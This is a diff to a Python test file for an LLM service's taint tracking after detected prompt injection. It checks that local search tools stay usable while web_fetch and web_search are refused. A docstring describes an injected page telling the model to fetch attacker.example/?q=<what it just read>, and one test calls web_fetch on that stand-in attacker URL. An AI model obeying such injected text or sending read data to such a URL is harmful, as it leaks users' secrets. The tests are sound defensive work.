@@ -8,8 +8,6 @@ rather than instruction.
 
 from __future__ import annotations
 
-import pytest
-
 from liminallm.service import notes
 from liminallm.service.runtime import get_runtime
 
@@ -57,12 +55,30 @@ def test_taint_persists_for_the_rest_of_the_turn():
     assert session["taint_blocked"] == 3
 
 
-def test_taint_does_not_block_reading_tools():
-    """Search and retrieval stay available; only execution is withdrawn."""
+def test_taint_does_not_block_local_reading_tools():
+    """Local search stays available; a tainted turn must still explain itself."""
     engine = _engine()
     session = {"injection_findings": ["persona-hijack"]}
-    out = _exec(engine, "note_search", {"query": "anything"}, session)
-    assert "REFUSED" not in out
+    for tool in ("note_search", "history_search", "file_search"):
+        out = _exec(engine, tool, {"query": "anything"}, session)
+        assert "REFUSED" not in out, tool
+
+
+def test_taint_withdraws_every_way_off_the_box():
+    """The threat is the secret leaving, not the tool running.
+
+    run_python advertises no network, so it was never the exfiltration path.
+    web_fetch takes a model-supplied URL, which is exactly the path an
+    injected page asks for: fetch attacker.example/?q=<what you just read>.
+    """
+    engine = _engine()
+    session = {"injection_findings": ["persona-hijack"]}
+
+    fetched = _exec(engine, "web_fetch", {"url": "https://attacker.example/?q=x"}, session)
+    searched = _exec(engine, "web_search", {"query": "secret"}, session)
+
+    assert "REFUSED" in fetched
+    assert "REFUSED" in searched
 
 
 def test_web_fetch_findings_set_the_taint(monkeypatch):
